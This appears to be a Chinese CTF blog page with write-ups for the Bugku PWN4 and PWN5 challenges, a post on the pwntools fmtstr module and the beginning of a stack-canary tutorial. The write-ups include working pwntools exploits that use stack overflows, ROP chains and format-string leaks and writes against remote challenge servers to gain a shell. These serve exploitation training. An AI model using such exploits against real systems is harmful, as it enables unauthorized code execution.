<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">main</span><span class="params">(__int64 a1, <span class="keyword">char</span> **a2, <span class="keyword">char</span> **a3)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x10</span>uLL);</span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Come on,try to pwn me"</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x30</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"So~sad,you are fail"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0L</span>L;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在很明显的栈溢出漏洞</p>
<p>函数虽然调用了<strong>system</strong>，但参数不是<strong>“/bin/sh”</strong>，无法获得<strong>shell</strong>。所以需要我们自己构造<strong>shell</strong>将<strong>“/bin/sh”</strong>作为参数传给<strong>system</strong>函数，然后调用。在<strong>ida</strong>的数据段搜索<strong>“/bin/sh”</strong>,找不到，但是可以找到<strong>“$0”</strong>,也可以得到<strong>shell</strong></p>
<blockquote>
<p><strong>$0</strong>在<strong>linux</strong>中为为<strong>shell</strong>或<strong>shell</strong>脚本的名称。<strong>system()</strong>会调用<strong>fork()</strong>产生子进程，由子进程来调用<strong>/bin/sh -c string</strong>来执行参数<strong>string</strong>字符串所代表的命令，此命令执行完后随即返回原调用的进程。所以如果将<strong>$0</strong>作为<strong>system</strong>的参数，能达到传入<strong>‘/bin/sh’</strong>一样的效果。</p>
</blockquote>
<p>还有要注意的就是64位程序和32位程序的传参方式不一样，32位的函数调用使用栈传参，64位的函数调用使用寄存器传参，分别用<strong>rdi</strong>、<strong>rsi</strong>、<strong>rdx</strong>、<strong>rcx</strong>、<strong>r8</strong>、<strong>r9</strong>来传递参数（参数个数小于7的时候）。</p>
<p>我们利用<strong>ROPgadget</strong>工具进行查找，得到<strong>pop rdi ; ret</strong> 和<strong>$0</strong>的地址,<strong>system</strong>的地址直接在<strong>IDA</strong>中查看</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">syc@ubuntu:/mnt/hgfs/share/Bugku/PWN/pwn4$ ROPgadget --binary pwn4 --only 'pop|ret'</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">0x00000000004007cc : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007ce : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007d0 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007d2 : pop r15 ; ret</span><br><span class="line">0x00000000004007cb : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000004007cf : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400630 : pop rbp ; ret</span><br><span class="line">0x00000000004007d3 : pop rdi ; ret</span><br><span class="line">0x00000000004007d1 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x00000000004007cd : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000400541 : ret</span><br><span class="line"></span><br><span class="line">Unique gadgets found: 11</span><br></pre></td></tr></table></figure>

<p>然后直接开写exp吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">'114.116.54.89'</span>, <span class="number">10004</span>)</span><br><span class="line"><span class="comment">#p = process('./pwn4')</span></span><br><span class="line">pop_rdi = <span class="number">0x00000000004007d3</span> </span><br><span class="line">bin_sh = <span class="number">0x000000000060111f</span></span><br><span class="line">system = <span class="number">0x000000000040075A</span></span><br><span class="line">payload = <span class="string">'A'</span> * (<span class="number">0x10</span>+<span class="number">8</span>) + p64(pop_rdi) + p64(bin_sh) + p64(system)  </span><br><span class="line">p.recvuntil(<span class="string">'Come on,try to pwn me'</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span> ls</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">flag</span><br><span class="line">lib</span><br><span class="line">lib32</span><br><span class="line">lib64</span><br><span class="line">stack2</span><br><span class="line"><span class="meta">$</span> cat flag</span><br><span class="line">flag&#123;264bc50112318cd6e1a67b0724d6d3af&#125;$</span><br></pre></td></tr></table></figure>

<h2 id="PWN-5"><a href="#PWN-5" class="headerlink" title="PWN 5"></a>PWN 5</h2><p>先检查一下文件</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[*] '/mnt/hgfs/share/Bugku/PWN/pwn5/human'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br></pre></td></tr></table></figure>

<p>直接拿IDA Pro打开反汇编一下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [rsp+0h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(_bss_start, <span class="number">0L</span>L, <span class="number">2</span>, <span class="number">0L</span>L);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0L</span>L, <span class="number">1</span>, <span class="number">0L</span>L);</span><br><span class="line">  <span class="built_in">memset</span>(&amp;s, <span class="number">0</span>, <span class="number">0x20</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;::s);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">8u</span>LL);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;s, &amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;s);</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_400978);</span><br><span class="line">  sleep(<span class="number">1u</span>);</span><br><span class="line">  <span class="built_in">puts</span>(asc_400998);</span><br><span class="line">  read(<span class="number">0</span>, &amp;s, <span class="number">0x40</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strstr</span>(&amp;s, &amp;needle) || !<span class="built_in">strstr</span>(&amp;s, &amp;byte_4009BA) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(&amp;byte_4009C8);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">puts</span>(&amp;byte_4009F8);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>首先发现第一次输入存在<strong>printf</strong>函数，存在格式化字符串漏洞，泄露出栈上的<strong>libc_start_main</strong>。<strong>libc_start_main</strong>是<strong>libc</strong>中的函数，可以泄露出加载<strong>libc</strong>的基地址。然后就是找服务器<strong>system</strong>地址和<strong>binsh</strong>地址，通过<strong>gadget</strong>赋值。关键是如何通过字符串泄露出<strong>libc_start_main</strong>的地址，我们通过动态调试来看</p>
<p>首先在printf函数下一个断点，然后运行到此处，查看栈上的情况</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">stack</span> <span class="number">50</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rdi rsi rsp  <span class="number">0x7fffffffde60</span> ◂— <span class="number">0xa61</span> <span class="comment">/* 'a\n' */</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│              <span class="number">0x7fffffffde68</span> ◂— <span class="number">0x0</span></span><br><span class="line">... ↓</span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│ rbp          <span class="number">0x7fffffffde80</span> —▸ <span class="number">0x4008d0</span> (__libc_csu_init) ◂— push   r15</span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│              <span class="number">0x7fffffffde88</span> —▸ <span class="number">0x7ffff7a2d830</span> (__libc_start_main+<span class="number">240</span>) ◂— mov    edi, eax</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/32w $rsp</span><br><span class="line">0x7fffffffde60:	0x24313125	0x00000a70	0x00000000	0x00000000</span><br><span class="line">0x7fffffffde70:	0x00000000	0x00000000	0x00000000	0x00000000</span><br><span class="line">0x7fffffffde80:	0x004008d0	0x00000000	0xf7a2d830	0x00007fff</span><br><span class="line">0x7fffffffde90:	0xffffdf68	0x00007fff	0xffffdf68	0x00007fff</span><br><span class="line">0x7fffffffdea0:	0xf7b99608	0x00000001	0x00400796	0x00000000</span><br><span class="line">0x7fffffffdeb0:	0x00000000	0x00000000	0x603a5ce0	0xa87e90b7</span><br><span class="line">0x7fffffffdec0:	0x004006a0	0x00000000	0xffffdf60	0x00007fff</span><br><span class="line">0x7fffffffded0:	0x00000000	0x00000000	0x00000000	0x00000000</span><br></pre></td></tr></table></figure>

<p>可以看到在栈上第11个位置存在<strong>libc_start_main+240</strong>,即<strong>libc_start_main_ret</strong>的地址，把<strong>libc</strong>文件放在<strong>ida</strong>中，找到<strong>_libc_start_main</strong>函数中调用<strong>main</strong>函数的地方，查看地址。这个<strong>main</strong>的返回地址就=<strong>libc</strong>基址+<strong>0x2082E</strong>(这个<strong>call rax</strong>的偏移地址) + <strong>2</strong>(<strong>call rax</strong>的长度为2)，<strong>libc</strong>的<strong>system</strong>函数偏移地址<strong>0x45390</strong>，<strong>“/bin/sh”</strong>字符串偏移地址<strong>0x18cd57</strong>，<strong>human</strong>的<strong>pop_rdi_ret</strong>地址<strong>0x400933</strong>，<strong>libc</strong>中函数的实际地址=<strong>libc</strong>基址 + 函数偏移地址</p>
<p>然后变量<strong>s</strong>存在溢出，且要避免执行<strong>exit()</strong>;查看<strong>if</strong>中比较的两个字符串，一个是“<strong>真香</strong>”，一个是“<strong>鸽子</strong>”，也就是说输入字符串<strong>s</strong>中要同时存在这两个词。</p>
<p>故可写Exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"114.116.54.89"</span>, <span class="string">"10005"</span>)</span><br><span class="line"><span class="comment">#p = process("./human")</span></span><br><span class="line">pop_rdi = <span class="number">0x400933</span></span><br><span class="line">bin_add = <span class="number">0x18cd57</span></span><br><span class="line">sys_add = <span class="number">0x45390</span></span><br><span class="line">gezi = <span class="string">"鸽子"</span></span><br><span class="line">zhenxiang = <span class="string">"真香"</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"?\n"</span>)</span><br><span class="line">p.sendline(<span class="string">"%11$p."</span>)</span><br><span class="line"><span class="keyword">print</span> p.recvline()</span><br><span class="line">libc_leak = int(p.recvline()[<span class="number">2</span>:<span class="number">-2</span>],<span class="number">16</span>)</span><br><span class="line">libc_base = libc_leak - <span class="number">0x20830</span></span><br><span class="line"><span class="keyword">print</span> p.recvuntil(<span class="string">"还有什么本质?"</span>)</span><br><span class="line">bin_abs = libc_base + bin_add</span><br><span class="line">sys_abs = libc_base + sys_add</span><br><span class="line">payload = (gezi+zhenxiang).ljust(<span class="number">0x20</span>+<span class="number">8</span>,<span class="string">"A"</span>)</span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(bin_abs)</span><br><span class="line">payload += p64(sys_abs)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>


        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/24/fmtstr─ú┐Θ╡─╩╣╙├/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/24/fmtstr─ú┐Θ╡─╩╣╙├/" class="post-title-link" itemprop="url">fmtstr模块的使用</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-24 23:46:18" itemprop="dateCreated datePublished" datetime="2019-09-24T23:46:18-07:00">2019-09-24</time>
            </span>
          
            

            
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="fa fa-calendar-check-o"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2019-09-25 14:46:54" itemprop="dateModified" datetime="2019-09-25T14:46:54-07:00">2019-09-25</time>
              </span>
            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p>总所周知，在CTF题目中，有一种很基础但又很令人烦的题型就是格式化字符串，因为我觉得其中的内存构造其实计算得是比较复杂的，但是有了<strong>pwntools</strong>内置的<strong>fmtstr</strong>模块对于很多简单的<strong>Format String Vulnerability</strong>就秒了</p>
<h2 id="cgfsb"><a href="#cgfsb" class="headerlink" title="cgfsb"></a>cgfsb</h2><p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/2.png" alt="img"></p>
<p>不难看出这题的解法就是让<strong>pwnme</strong>的值为8就好了，按照传统的做法我们需要测量写入位置的参数然后构造复杂的字符串序列，使用<strong>pwntools</strong>的模块可以大幅简化构造流程，但是我们还是需要测量写入位置</p>
<p>通过 <strong>ida</strong> 查看汇编代码 找到<code>call printf</code>的地址（调用<strong>printf(&amp;s)</strong>）。之后我们用<strong>gdb</strong>进行调试，在调用<strong>printf(&amp;s)</strong>之前下一个断点,查看接收 <strong>message</strong> 的变量 <strong>s</strong> 是格式化字符串的第几个参数。输入 <strong>message</strong> 的时候输入 <strong>‘aaaa’</strong></p>
<p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/3.png" alt="img"></p>
<p>查看当前栈中的内容</p>
<p><img src="https://adworld.xctf.org.cn/media/task/writeup/cn/CGfsb/pic/4.png" alt="img"></p>
<p>传统的Exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span> </span><br><span class="line">DEBUG = int(sys.argv[<span class="number">1</span>])</span><br><span class="line"><span class="keyword">if</span> DEBUG == <span class="number">1</span>:</span><br><span class="line">	p = process(<span class="string">'./cgfsb'</span>) </span><br><span class="line"><span class="keyword">else</span>: </span><br><span class="line">	p = remote(<span class="string">'10.10.49.194'</span>, <span class="number">30147</span>)</span><br><span class="line">pwnme_addr = <span class="number">0x0804A068</span></span><br><span class="line">payload1 = <span class="string">"ABCD"</span> </span><br><span class="line">payload2 = p32(pwnme_addr) + <span class="string">'aaaa%10$n'</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>) </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line"><span class="keyword">print</span> p.recv() </span><br><span class="line"><span class="keyword">print</span> p.recv()</span><br></pre></td></tr></table></figure>

<p>使用pwntools fmtstr模块的Exploit</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">41020</span>)</span><br><span class="line"><span class="comment">#p = process('./fmt')</span></span><br><span class="line">payload1 = <span class="string">"ABCD"</span></span><br><span class="line">p.recvuntil(<span class="string">'please tell me your name:\n'</span>) </span><br><span class="line">p.sendline(payload1)</span><br><span class="line">payload2 = fmtstr_payload(<span class="number">10</span>,&#123;<span class="number">0x0804A068</span>:<span class="number">0x8</span>&#125;)</span><br><span class="line">p.recvuntil(<span class="string">'leave your message please:\n'</span>) </span><br><span class="line">p.sendline(payload2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>其中<strong>10</strong>即为参数位置，<strong>0x0804A068</strong>即为需要修改的地址，<strong>0x8</strong>即为需要的值</p>

        
      
    </div>

    
    
    
      <footer class="post-footer">
          <div class="post-eof"></div>
        
      </footer>
  </div>
  
  
  
  </article>

    
       <article itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block home">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/09/18/┤╙BabyCanary╚δ├┼Canary/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="ZERO-A-ONE">
      <meta itemprop="description" content="Resit much,Obey little">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZERO-A-ONE">
    </span>
      <header class="post-header">
        <h1 class="post-title" itemprop="name headline">
            
            <a href="/2019/09/18/┤╙BabyCanary╚δ├┼Canary/" class="post-title-link" itemprop="url">从BabyCanary入门Canary</a>
          
        </h1>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              
                
              

              <time title="Created: 2019-09-18 05:31:13 / Modified: 20:31:38" itemprop="dateCreated datePublished" datetime="2019-09-18T05:31:13-07:00">2019-09-18</time>
            </span>
          
            

            
          

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>Canary</strong>直译就是金丝雀，为什么是叫金丝雀</p>
<p>17世纪，英国矿井工人发现，金丝雀对瓦斯这种气体十分敏感。空气中哪怕有极其微量的瓦斯，金丝雀也会停止歌唱；而当瓦斯含量超过一定限度时，虽然鲁钝的人类毫无察觉，金丝雀却早已毒发身亡。当时在采矿设备相对简陋的条件下，工人们每次下井都会带上一只金丝雀作为“瓦斯检测指标”，以便在危险状况下紧急撤离</p>
<p>由于 <strong>stack overflow</strong> 而引发的攻击非常普遍也非常古老, 相应地一种叫做 <strong>canary</strong> 的 <strong>mitigation</strong> 技术很早就出现在 <strong>glibc</strong> 里, 直到现在也作为系统安全的第一道防线存在。</p>
<p><strong>Canary</strong> 不管是实现还是设计思想都比较简单高效, 就是插入一个值, 在 <strong>stack overflow</strong> 发生的 高危区域的尾部, 当函数返回之时检测 <strong>canary</strong> 的值是否经过了改变, 以此来判断 <strong>stack/buffer overflow</strong> 是否发生.</p>
<p><strong>Canary</strong> 与 <strong>windows</strong> 下的 <strong>GS</strong> 保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了 <strong>linux</strong> 下保护机制的标配</p>
<h2 id="Canary-原理"><a href="#Canary-原理" class="headerlink" title="Canary 原理"></a>Canary 原理</h2><h3 id="在-GCC-中使用-Canary"><a href="#在-GCC-中使用-Canary" class="headerlink" title="在 GCC 中使用 Canary"></a>在 GCC 中使用 Canary</h3><p>可以在 <strong>GCC</strong> 中使用以下参数设置 <strong>Canary</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span><br><span class="line">-fstack-protector-all 启用保护，为所有函数插入保护</span><br><span class="line">-fstack-protector-strong</span><br><span class="line">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span><br><span class="line">-fno-stack-protector 禁用保护.</span><br></pre></td></tr></table></figure>

<h3 id="Canary-实现原理"><a href="#Canary-实现原理" class="headerlink" title="Canary 实现原理"></a>Canary 实现原理</h3><p>开启 <strong>Canary</strong> 保护的 <strong>stack</strong> 结构大概如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">  High</span><br><span class="line">  Address |                 |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | args            |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | return address  |</span><br><span class="line">          +-----------------+</span><br><span class="line">  rbp =&gt;  | old ebp         |</span><br><span class="line">          +-----------------+</span><br><span class="line">rbp-8 =&gt;  | canary value    |</span><br><span class="line">          +-----------------+</span><br><span class="line">          | 局部变量        |</span><br><span class="line">  Low     |                 |</span><br><span class="line">  Address</span><br></pre></td></tr></table></figure>

<p>当程序启用 <strong>Canary</strong> 编译后，在函数序言部分会取 <strong>fs</strong> 寄存器 <strong>0x28</strong> 处的值，存放在栈中 <strong>%ebp-0x8</strong> 的位置。 这个操作即为向栈中插入 <strong>Canary</strong> 值，代码如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov    rax, qword ptr fs:[0x28]</span><br><span class="line">mov    qword ptr [rbp - 8], rax</span><br></pre></td></tr></table></figure>

<p>在函数返回之前，会将该值取出，并与 <strong>fs:0x28</strong> 的值进行异或。如果异或的结果为 <strong>0</strong>，说明 <strong>canary</strong> 未被修改，函数会正常返回，这个操作即为检测是否发生栈溢出。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mov    rdx,QWORD PTR [rbp-0x8]</span><br><span class="line">xor    rdx,QWORD PTR fs:0x28</span><br><span class="line">je     0x4005d7 &lt;main+65&gt;</span><br><span class="line">call   0x400460 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>

<p>如果 <strong>canary</strong> 已经被非法修改，此时程序流程会走到 <code>__stack_chk_fail</code>。<code>__stack_chk_fail</code> 也是位于 <strong>glibc</strong> 中的函数，默认情况下经过 <strong>ELF</strong> 的延迟绑定，定义如下。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eglibc<span class="number">-2.19</span>/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) __stack_chk_fail (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span> __attribute__ ((noreturn)) internal_function __fortify_fail (<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这意味可以通过劫持 <code>__stack_chk_fail</code>的 <strong>go</strong>t 值劫持流程或者利用 <code>__stack_chk_fail</code> 泄漏内容</p>
<p>进一步，对于 <strong>Linux</strong> 来说，<strong>fs</strong> 寄存器实际指向的是当前栈的 <strong>TLS</strong> 结构，<strong>fs:0x28</strong> 指向的正是 <strong>stack_guard</strong>。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> 